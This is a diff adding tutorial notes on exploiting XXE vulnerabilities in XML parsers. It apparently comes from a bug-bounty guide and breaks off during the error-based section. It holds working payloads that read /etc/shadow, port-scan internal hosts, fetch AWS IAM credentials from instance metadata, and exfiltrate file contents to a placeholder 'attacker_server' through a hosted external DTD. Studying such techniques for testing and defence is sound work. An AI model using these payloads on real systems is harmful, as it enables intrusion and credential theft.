@@ -1,0 +1,92 @@
+- What you can achieve with an XXE vulnerability depends on the permissions given to the XML parser. Generally, you can use XXEs to access and exfiltrate system files, source code, and directory listings on the local machine. You can also use XXEs to perform SSRF attacks to port-scan the target’s network, read
+files on the network, and access resources that are hidden behind a firewall.
+
+- Reading Files:
+
+- To read local files by using an XXE vulnerability, place the local file’s path into the DTD of the parsed XML file. Local files can be accessed by using
+the file:// URL scheme followed by the file’s path on the machine. This payload will make the XML parser return the contents of the /etc/shadow file on the server:
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE example [
+<!ENTITY file SYSTEM "file:///etc/shadow">
+]>
+<example>&file;</example>
+
+- Launching an SSRF:
+
+- Besides retrieving system files, you can use the XXE vulnerability to launch SSRF attacks against the local network. For example, you can launch a port
+scan by switching out the external entity’s URL with different ports on the target machine, where you can determine the status of a port by analyzing differences in the server’s responses:
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE example [
+<!ENTITY file SYSTEM "http://10.0.0.1:80">
+]>
+<example>&file;</example>
+
+- You can also use an XXE to launch an SSRF to pull instance metadata, as we talked about in Chapter 13. This payload will make the parser return AWS metadata:
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE example [
+<!ENTITY file SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+]>
+<example>&file;</example>
+
+- When trying to view unintended data like this, you should look for the exfiltrated data by inspecting the page source code (right-click the page and click View Source) or HTTP response directly, rather than viewing the HTML page rendered by the browser, because the browser might not render the page correctly. Of course, what you can do with an XXE-based SSRF isn’t simply limited to network scanning and retrieving instance metadata. You can also use the information you gathered to pivot into internal services
+
+- Using Blind XXEs:
+
+- Sometimes the application does not return the results of XML parsing to the user. In this case, you can still exfiltrate data to a server that you control by forcing the XML parser to make an external request with the desired data in the request URL—the blind XXE attacks mentioned earlier. Then you can monitor your server logs to retrieve the exfiltrated data. At this point, you might think the payload of a blind XXE looks like this:
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE example [
+<!ENTITY file SYSTEM "file:///etc/shadow">
+<!ENTITY exfiltrate SYSTEM "http://attacker_server/?&file">
+]>
+<example>&exfiltrate;</example>
+
+- This payload is meant to exfiltrate the /etc/shadow file on the server by making a request to the attacker’s server with the file’s contents in a URL parameter. The payload first defines an external entity file that contains the contents of the local /etc/shadow file. Then it makes a request
+to the attacker’s server with the contents of that file in the request’s URL parameter.
+
+- However, this attack probably wouldn’t work, because most parsers do not allow external entities to be included in other external entities. And
+parsers would stop processing the DTD once they encounter this line:
+<!ENTITY exfiltrate SYSTEM "http://attacker_server/?&file">. So exfiltrating data by using a blind XXE is a bit more complicated than in a classic XXE.
+
+- Fortunately, XML DTDs have a feature called parameter entities that we can use instead. Parameter entities are XML entities that can be referenced only elsewhere within the DTD. They are declared and referenced with a percent (%) character. For example, the blind XXE payload I introduced earlier can be rewritten as follows:
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE example [
+<!ENTITY % file SYSTEM "file:///etc/shadow"> 1
+<!ENTITY % ent "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker_server/?%file;'>"> 2
+%ent;
+%exfiltrate;
+]>
+
+- This DTD first declares a parameter entity called file that contains the file contents of /etc/shadow 1. Then it declares a parameter entity named 'ent' that contains a dynamic declaration of another parameter entity called exfiltrate 2. &#x25; is the hex-encoded version of the percent sign (%).
+
+- Depending on your target, hex encoding is sometimes needed for special characters within dynamic declarations. The exfiltrate entity points to the attacker’s server with the contents of /etc/shadow in the URL parameter.
+
+- Finally, the DTD references ent to declare the exfiltrate entity and then references exfiltrate to trigger the outbound request. But if you try to upload this payload to a target, you might notice that it does not work. This is because, according to XML specifications, parameter entities are treated differently in inline DTDs (DTDs within the XML document specified within the DOCTYPE tag) and external DTDs (a separate DTD hosted elsewhere). Within inline DTDs, parameter entities cannot be referenced within markups, so this line wouldn’t work: <!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker_server/?%file;'>, whereas in external DTDs, no such restriction exists.
+
+- To exfiltrate data via a blind XXE, you have to overcome this restriction by hosting an external DTD on your server. Try hosting a file named xxe.dtd
+on your server:
+<!ENTITY % file SYSTEM "file:///etc/shadow">
+<!ENTITY % ent "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker_server/?%file;'>">
+%ent;
+%exfiltrate;
+
+- Then make the target parser interpret your DTD by specifying it within a parameter entity and referencing that entity:
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE example [
+<!ENTITY % xxe SYSTEM "http://attacker_server/xxe.dtd">
+%xxe;
+]>
+
+- This way, the target server will parse the submitted XML file and notice that a parameter entity is referencing an external file. Then the target server will retrieve and parse that external DTD, so your payload will execute, and the target will send the exfiltrated data back to your server. Here, we
+are exfiltrating the contents of the file /etc/shadow as a URL parameter in a request to the attacker’s server.
+
+- Notice that in this attack, we used only parameter entities and did not use external entities at all! If the parser blocks external entities or limits the
+referencing of entities to protect against XXE, you can use this technique as well. However, this strategy can exfiltrate only a single line of the target
+file, because the newline character (\n) within target files will interrupt the outbound URL and may even cause the HTTP request to fail.
+
+- An easier way to exfiltrate data via a blind XXE is by forcing the parser to return a descriptive error message. For example, you can induce a File
+Not Found error by referencing a nonexistent file as the value of an external entity. Your external DTD can be rewritten as follows:
+<!ENTITY % file SYSTEM "file:///etc/shadow">
+<!ENTITY % ent "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/?%file;'>">
+%ent;
+%error;
+
